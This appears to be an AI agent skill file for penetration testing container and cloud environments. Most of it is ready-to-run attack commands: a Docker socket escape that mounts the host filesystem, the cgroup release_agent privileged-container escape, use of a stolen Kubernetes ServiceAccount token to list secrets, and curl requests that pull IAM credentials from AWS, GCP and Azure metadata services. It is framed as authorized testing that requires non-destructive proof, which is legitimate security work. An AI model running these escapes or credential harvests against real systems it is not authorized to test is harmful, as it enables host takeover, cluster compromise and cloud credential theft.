---
name: cloud-container-escape
description: "Detect containerized and Kubernetes environments, identify container escape primitives (docker.sock mounts, privileged mode, dangerous capabilities), and escalate SSRF or command execution to Cloud IAM metadata."
---

# Cloud & Container Escape Testing

## Crown Jewel Targets

- **Host Operating System Takeover** — Escaping from a web application container or pod into the underlying VM or bare-metal host with root privileges.
- **Kubernetes Cluster Administrative Access** — Stealing mounted ServiceAccount tokens with overly permissive RBAC to enumerate or compromise the entire cluster.
- **Cloud IAM Credential Theft (SSRF to Cloud Account)** — Harvesting instance metadata tokens (AWS IMDS, GCP Metadata, Azure IMDS) to pivot from a single web endpoint to cloud infrastructure control.

## Attack Surface Signals

- **Container indicators**: Presence of `/.dockerenv`, cgroups containing `docker` or `kubepods` (`cat /proc/1/cgroup`), containerized hostnames (12-char hex).
- **Environment variables**: `KUBERNETES_SERVICE_HOST`, `KUBERNETES_PORT`, `ECS_CONTAINER_METADATA_URI`, `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.
- **Filesystem mounts**: `/var/run/docker.sock`, `/var/run/secrets/kubernetes.io/serviceaccount/`, `/host/`, `/sys/fs/cgroup`.
- **Network signals**: Reachability of `169.254.169.254`, `169.254.170.2`, or exposed Docker daemon ports (`2375`, `2376`, `10250`).

## Testing Methodology

### 1. Environment Fingerprinting
Upon obtaining command execution or shell access on a target:
```bash
# Check container markers
test -f /.dockerenv && echo "In Docker"
grep -qE "docker|kubepods|containerd" /proc/1/cgroup && echo "In Container"

# Check capabilities and privilege level
id
cat /proc/self/status | grep -i CapEff
# CapEff 0000003fffffffff indicates full --privileged container
```

### 2. Docker Socket Escape
If `/var/run/docker.sock` is mounted inside the container:
```bash
# Verify socket access
ls -la /var/run/docker.sock

# Query Docker daemon via curl if docker CLI is not present
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Launch a privileged container mounting the host root filesystem
curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","id"],"Binds":["/:/host"]}' \
  http://localhost/containers/create?name=escape
curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=1"
```

### 3. Privileged Mode & Cgroup Release Agent Escape
If the container runs with `--privileged` or `CAP_SYS_ADMIN`:
```bash
# Inspect mount permissions
mount | grep -i 'sysfs\|cgroup'

# If cgroupv1 is writable, test release_agent notification escape
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'ps aux > '$host_path'/output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"
head -n 20 /output
```

### 4. Kubernetes ServiceAccount Token Abuse
When running inside a Kubernetes Pod:
```bash
TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount"
if [ -f "$TOKEN_PATH/token" ]; then
    TOKEN=$(cat $TOKEN_PATH/token)
    NS=$(cat $TOKEN_PATH/namespace)
    APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT"
    
    # Check permissions using kubectl or raw API curl
    curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NS/secrets"
    curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NS/pods"
fi
```

### 5. Cloud Metadata (IMDS) Escalation via SSRF or Shell
When target is hosted on Cloud providers:
```bash
# AWS IMDSv1
curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (requires session token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata (requires header)
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# After extracting IAM credentials, run cloudfox or prowler:
# cloudfox aws -u -p <profile>
```

## Verification & Proof Requirements

- **Container Escape**: Provide non-destructive proof from the host perspective (e.g. `cat /host/etc/os-release` or host kernel version distinct from container).
- **ServiceAccount Abuse**: Provide API response showing successful secret or pod listing from the Kubernetes control plane.
- **Cloud Metadata Harvest**: Provide masked role name and token expiration timestamp from `sts:GetCallerIdentity` or equivalent metadata JSON.

